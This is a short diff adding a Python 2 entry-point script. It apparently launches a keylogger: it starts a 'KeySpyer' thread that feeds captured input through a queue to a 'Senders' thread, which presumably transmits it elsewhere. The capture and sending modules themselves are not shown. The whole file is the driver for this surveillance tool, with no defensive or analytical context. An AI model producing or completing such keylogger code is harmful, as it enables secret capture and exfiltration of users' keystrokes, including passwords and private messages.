@@ -1,0 +1,16 @@
+# coding:utf-8
+from KeySpy import  KeySpyer
+from Sender import Senders
+import  Queue
+import sys
+reload(sys)
+sys.setdefaultencoding("utf-8")
+
+
+if __name__ == "__main__":
+    q = Queue.Queue(100)
+
+    spyer = KeySpyer(q)
+    sender = Senders(q)
+    spyer.start()
+    sender.start()
